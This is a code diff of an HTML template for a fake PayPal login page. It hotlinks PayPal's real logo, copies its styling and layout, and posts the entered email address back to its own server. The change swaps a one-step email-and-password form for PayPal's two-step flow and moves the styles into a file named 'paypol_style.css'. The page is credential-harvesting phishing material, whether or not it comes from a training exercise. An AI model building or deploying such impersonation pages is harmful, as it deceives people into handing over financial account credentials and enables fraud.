@@ -4,119 +4,25 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PayPal Login</title>
-    <link rel="alternate icon" href="/Atlas-Injections/paypal_top.png" type="image/png">
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            border: 1px solid #ddd;
-            border-radius: 12px;
-            padding: 40px;
-            width: 350px;
-            text-align: center;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-        }
-        .logo {
-            font-size: 32px;
-            font-weight: bold;
-            color: #000;
-            margin-bottom: 30px;
-        }
-        input[type="text"], input[type="password"] {
-            width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            border-radius: 6px;
-            border: 1px solid #ccc;
-            box-sizing: border-box;
-        }
-        .forgot {
-            text-align: left;
-            font-size: 14px;
-            margin-bottom: 20px;
-        }
-        .forgot a {
-            color: #0070ba;
-            text-decoration: none;
-        }
-        .login-btn {
-            width: 100%;
-            background-color: #0070ba;
-            color: white;
-            border: none;
-            padding: 14px;
-            border-radius: 30px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        .login-btn:hover {
-            background-color: #005ea6;
-        }
-        .divider {
-            display: flex;
-            align-items: center;
-            text-align: center;
-            margin: 20px 0;
-        }
-        .divider::before, .divider::after {
-            content: '';
-            flex: 1;
-            border-bottom: 1px solid #ccc;
-        }
-        .divider:not(:empty)::before {
-            margin-right: .75em;
-        }
-        .divider:not(:empty)::after {
-            margin-left: .75em;
-        }
-        .signup-btn {
-            width: 100%;
-            background: none;
-            border: 2px solid #000;
-            padding: 14px;
-            border-radius: 30px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        .flag {
-            margin-top: 20px;
-            font-size: 14px;
-        }
-        footer {
-            text-align: center;
-            font-size: 12px;
-            color: #777;
-            position: absolute;
-            bottom: 20px;
-            width: 100%;
-        }
-        footer a {
-            color: #000;
-            text-decoration: none;
-            margin: 0 5px;
-        }
-    </style>
+    <link rel="alternate icon" href="{{ url_for('static', filename='paypal_top.png') }}" type="image/png">
+    <link rel="stylesheet" href="{{ url_for('static', filename='paypol_style.css') }}">
 </head>
 <body>
     <div class="container">
-        <div class="logo">PayPal</div>
+        <div class="logo">
+            <img src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-wordmark-color.svg" width="30%" alt="owo what's this">
+        </div>
        
         <form method="POST">
             <input type="text" name="email" placeholder="Email address or mobile number" required>
-            <input type="password" name="password" placeholder="Password" required>
-            <div class="forgot"><a href="#">Forgotten password?</a></div>
-            <button type="submit" class="login-btn">Log In</button>
+            <div class="forgot"><a href="#">Forgotten your email address?</a></div>
+            <button type="submit" class="login-btn">Next</button>
         </form>
         <div class="divider">or</div>
         <button class="signup-btn">Sign Up</button>
-        <div class="flag">🇬🇧</div>
+        <p></p>
+        <label for="location-dropdown">🇬🇧</label>
+        <select class="location-dropdown"></select>
     </div>
     <footer>
         <a href="#">Contact us</a>
